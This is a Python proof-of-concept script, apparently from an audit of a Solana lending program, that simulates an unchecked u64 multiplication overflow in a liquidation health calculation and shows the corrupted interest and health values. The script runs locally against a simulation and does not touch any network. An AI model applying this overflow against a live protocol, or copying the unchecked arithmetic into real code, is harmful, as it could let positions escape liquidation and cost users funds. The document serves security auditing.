"""Exploit PoC: Integer overflow in liquidation interest calc (SEM-003).

Demonstrates that the multiplication borrowed * interest_rate * total_borrows
can overflow u64, producing a WRONG interest value. This corrupts the health
factor calculation, making positions appear healthier than they actually are.
"""
from dataclasses import dataclass


@dataclass
class Pool:
    """Simulates the on-chain Pool account."""
    total_deposits: int = 0
    total_borrows: int = 0
    interest_rate: int = 500  # 5% in basis points


@dataclass
class UserAccount:
    """Simulates the on-chain UserAccount."""
    deposited: int = 0
    borrowed: int = 0


# Simulate Rust u64 overflow behavior (release mode wrapping)
U64_MAX = (1 << 64) - 1


def u64_wrapping_mul(a: int, b: int) -> int:
    """Simulates Rust unchecked u64 multiplication (wrapping on overflow)."""
    return (a * b) & U64_MAX


def calculate_health_vulnerable(pool: Pool, user: UserAccount) -> dict:
    """Simulates the VULNERABLE liquidate health check."""
    temp = u64_wrapping_mul(user.borrowed, pool.interest_rate)
    interest = u64_wrapping_mul(temp, pool.total_borrows)
    denominator = (user.borrowed + interest) & U64_MAX
    if denominator == 0:
        return {"interest": interest, "health": "division_by_zero", "error": True}
    health = (user.deposited * 100) // denominator
    return {"interest": interest, "health": health, "can_liquidate": health < 75, "error": False}


def calculate_health_correct(pool: Pool, user: UserAccount) -> dict:
    """What the CORRECT health calculation should look like."""
    interest = user.borrowed * pool.interest_rate * pool.total_borrows
    denominator = user.borrowed + interest
    if denominator == 0:
        return {"interest": interest, "health": "division_by_zero", "error": True}
    health = (user.deposited * 100) // denominator
    return {"interest": interest, "health": health, "can_liquidate": health < 75, "error": False}


def main():
    print("=" * 60)
    print("EXPLOIT: Integer Overflow Corrupts Liquidation Math")
    print("=" * 60)

    pool = Pool(
        total_borrows=500_000_000_000_000,  # 500,000 SOL total borrows
        interest_rate=500,
    )
    user = UserAccount(
        deposited=50_000_000_000,   # 50 SOL deposited
        borrowed=100_000_000_000,   # 100 SOL borrowed
    )

    print(f"\nSetup:")
    print(f"  User deposited:     {user.deposited:>25,} lamports ({user.deposited / 1e9:.0f} SOL)")
    print(f"  User borrowed:      {user.borrowed:>25,} lamports ({user.borrowed / 1e9:.0f} SOL)")
    print(f"  Pool total borrows: {pool.total_borrows:>25,} lamports ({pool.total_borrows / 1e9:,.0f} SOL)")

    print("\n--- Correct calculation (checked math) ---")
    correct = calculate_health_correct(pool, user)
    print(f"  Interest:      {correct['interest']:,}")
    print(f"  Health factor: {correct['health']}")

    print("\n--- Vulnerable calculation (u64 wrapping) ---")
    vuln = calculate_health_vulnerable(pool, user)
    print(f"  Interest:      {vuln['interest']:,}")
    print(f"  Health factor: {vuln['health']}")

    real_interest = user.borrowed * pool.interest_rate * pool.total_borrows
    wrapped_interest = vuln['interest']
    corruption = abs(real_interest - wrapped_interest) / real_interest * 100

    print(f"\n  Real interest:    {real_interest:,}")
    print(f"  Wrapped interest: {wrapped_interest:,}")
    print(f"  Value corruption: {corruption:.1f}%")

    assert real_interest > U64_MAX, "Multiplication overflows u64"
    assert wrapped_interest != real_interest, "Wrapped value differs from correct value"

    print("\n  >>> EXPLOIT CONFIRMED: Integer overflow corrupts liquidation math <<<")
    print("=" * 60)


if __name__ == "__main__":
    main()
